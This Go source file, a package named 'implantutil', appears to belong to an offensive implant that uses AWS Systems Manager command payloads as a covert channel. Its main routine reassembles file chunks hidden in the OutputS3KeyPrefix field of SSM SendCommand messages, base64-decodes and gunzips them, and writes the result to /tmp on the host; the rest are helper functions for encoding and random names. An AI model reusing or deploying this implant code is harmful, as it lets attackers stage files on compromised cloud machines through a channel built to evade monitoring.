package implantutil

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"unicode/utf8"

	"github.com/grines/ssmmm/awsssm"
)

var completeFile []FileParts

type FileParts struct {
	CurrentCount string
	TotalCount   string
	Filename     string
	FileData     string
}

func Base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func Base64Decode(str string) string {
	data, _ := base64.StdEncoding.DecodeString(str)
	return string(data)
}

func Contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}

func Split(s string, size int) []string {
	ss := make([]string, 0, len(s)/size+1)
	for len(s) > 0 {
		if len(s) < size {
			size = len(s)
		}
		ss, s = append(ss, s[:size]), s[size:]

	}
	return ss
}

var letters = []rune("123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func Exists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}

func TrimFirstRune(s string) string {
	_, i := utf8.DecodeRuneInString(s)
	return s[i:]
}

func RecieveFile(payload awsssm.SendCommandPayload) {

	s := strings.Split(payload.OutputS3KeyPrefix, ":")

	if len(s) == 4 {

		file := FileParts{
			CurrentCount: s[0],
			TotalCount:   s[1],
			Filename:     s[2],
			FileData:     s[3],
		}

		completeFile = append(completeFile, file)

		CheckFile(file)

	}

}

func CheckFile(file FileParts) {
	var singleFile []FileParts
	intVar, _ := strconv.Atoi(file.TotalCount)

	for _, v := range completeFile {
		if v.Filename == file.Filename {
			singleFile = append(singleFile, v)
			if len(singleFile) == intVar {
				SaveFile(singleFile, v.Filename)
				fmt.Println("Uploaded")
			}
		}
	}
}

func SaveFile(file []FileParts, filename string) {
	var pieces []string

	for _, v := range file {
		pieces = append(pieces, v.FileData)

	}
	asone := strings.Join(pieces, "")
	decoded := Base64Decode(asone)
	b := []byte(decoded)
	actual, err := ReadGzFile(b)
	if err != nil {
		return
	}
	d1 := []byte(actual)
	os.WriteFile("/tmp/"+filepath.Base(filename), d1, 0644)
	//completeFile = []FileParts{}
}

func ReadGzFile(fi []byte) (string, error) {

	fz, err := gzip.NewReader(bytes.NewReader(fi))
	if err != nil {
		return "", err
	}
	defer fz.Close()

	s, err := ioutil.ReadAll(fz)
	if err != nil {
		return "", err
	}
	return string(s), nil
}
